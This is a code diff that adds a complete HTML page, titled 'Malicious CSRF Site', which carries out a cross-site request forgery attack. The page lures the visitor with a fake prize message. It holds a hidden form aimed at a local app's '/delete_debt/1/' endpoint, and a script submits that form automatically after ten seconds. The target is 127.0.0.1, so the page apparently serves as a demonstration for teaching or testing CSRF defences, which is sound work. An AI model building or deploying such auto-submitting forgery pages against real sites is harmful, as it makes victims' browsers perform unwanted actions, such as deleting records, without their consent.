@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Malicious CSRF Site</title>
+  </head>
+  <body>
+    <h1>Congratulations, you won a prize!</h1>
+
+    <form
+      id="csrf-form"
+      action="http://127.0.0.1:8000/delete_debt/1/"
+      method="POST"
+    >
+      <input type="hidden" name="dummy" value="data" />
+    </form>
+
+    <p id="status">Loading your prize... (Redirecting in 10 seconds)</p>
+
+    <script>
+      setTimeout(function () {
+        document.getElementById("status").innerText = "Redirecting now...";
+        document.getElementById("csrf-form").submit();
+      }, 10000);
+    </script>
+  </body>
+</html>
